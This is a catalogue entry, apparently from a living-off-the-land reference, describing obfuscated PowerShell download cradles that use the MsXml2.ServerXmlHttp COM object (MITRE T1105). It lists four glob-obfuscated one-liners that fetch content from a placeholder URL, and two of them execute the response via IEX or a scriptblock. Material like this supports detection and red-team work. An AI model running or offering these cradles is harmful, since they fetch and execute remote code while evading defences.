---
Name: MsXml2.ServerXmlHttp
Description: "COM object for HTTP requests, instantiated via New-Object -ComObject. Glob-obfuscates the New-Object cmdlet via gcm. Chains with DIR Alias:/ PSDrive glob for execution — two independent PowerShell glob mechanisms in one cradle."
Platform: powershell
BinaryPath:
  - "COM object (MSXML6.dll)"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "$x=(& (gcm N*-O*) -ComObject MsXml2.ServerXmlHttp);$x.Open('GET','http://...',$false);$x.Send()"
    Wildcards: ["*"]
    Notes: "gcm glob resolves New-Object; -ComObject creates the MsXml2.ServerXmlHttp COM instance"
  - Pattern: "$x=(& (gcm N?w-Ob*) -ComObject MsXml2.ServerXmlHttp);$x.Open('GET','http://...',$false);$x.Send()"
    Wildcards: ["?", "*"]
    Notes: "Mixed ? and * wildcards on New-Object cmdlet name"
  - Pattern: "$x=(& (gcm N*-O*) -ComObject MsXml2.ServerXmlHttp);$x.Open('GET','http://...',$false);$x.Send();&(DIR Alias:/I*X) $x.ResponseText"
    Wildcards: ["*"]
    Notes: "Dual-glob cradle: gcm on New-Object + DIR Alias:/I*X PSDrive glob resolves IEX for execution"
  - Pattern: "$x=(& (gcm N*-O*) -ComObject MsXml2.ServerXmlHttp);$x.Open('GET','http://...',$false);$x.Send();[scriptblock]::Create($x.ResponseText).Invoke()"
    Wildcards: ["*"]
    Notes: "gcm glob on New-Object; scriptblock used for execution as an alternative to IEX"
PlatformNotes: |
  `MsXml2.ServerXmlHttp` is a COM-based HTTP client available on all Windows versions with MSXML installed.

  The `DIR Alias:/I*X` pattern uses PowerShell's `Alias:` PSDrive as a glob target — `DIR Alias:/I*X` resolves to the `IEX` alias entry, which `&` then invokes. This is a filesystem-style glob against the PowerShell provider namespace, distinct from `gcm`/`gal` resolution.

  Credit: [mgeeky](https://github.com/mgeeky) — [PowerShell Download Cradles](https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38)
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
---
